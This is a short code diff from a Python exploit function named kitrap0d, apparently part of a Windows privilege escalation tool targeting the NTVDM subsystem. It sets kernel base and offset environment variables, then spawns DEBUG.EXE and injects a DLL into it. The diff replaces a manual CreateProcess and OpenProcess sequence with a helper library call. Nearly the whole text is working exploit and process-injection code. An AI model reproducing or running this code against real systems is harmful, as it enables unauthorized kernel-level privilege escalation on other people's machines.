@@ -66,29 +66,5 @@ def kitrap0d():
     kernel32.SetEnvironmentVariableA("VDM_TARGET_KRN",kernbase)
     kernel32.SetEnvironmentVariableA("VDM_TARGET_OFF",kernoff)
 
-    startupinfo = wintypes.STARTUPINFO()
-    process_information = wintypes.PROCESS_INFORMATION()
-    #startupinfo.dwFlags = 0x1
-    #startupinfo.wShowWindow = 0x0
-    startupinfo.cb = ctypes.sizeof(startupinfo)
-    kernel32.CreateProcessA(
-                            "C:\\WINDOWS\\SYSTEM32\\DEBUG.EXE",
-                            "C:\\WINDOWS\\SYSTEM32\\DEBUG.EXE",
-                            None,
-                            None,
-                            False,
-                            0x4,
-                            None,
-                            None,
-                            ctypes.byref(startupinfo),
-                            ctypes.byref(process_information)
-                            )
-    ntvdm = kernel32.OpenProcess(
-                        0x43b,
-                        False,
-                        process_information.dwProcessId
-                        )
-    kernel32.CloseHandle(process_information.hThread)
-    kernel32.CloseHandle(process_information.hProcess)
-    ntvdminject = dllinject.Process(handle=ntvdm)
-    print ntvdminject.inject("MemoryModule\\MemoryModule.dll")
+    ntvdminject = dllinject.Process(pe="C:\\WINDOWS\\SYSTEM32\\DEBUG.EXE")
+    ntvdminject.inject("MemoryModule\\MemoryModule.dll")
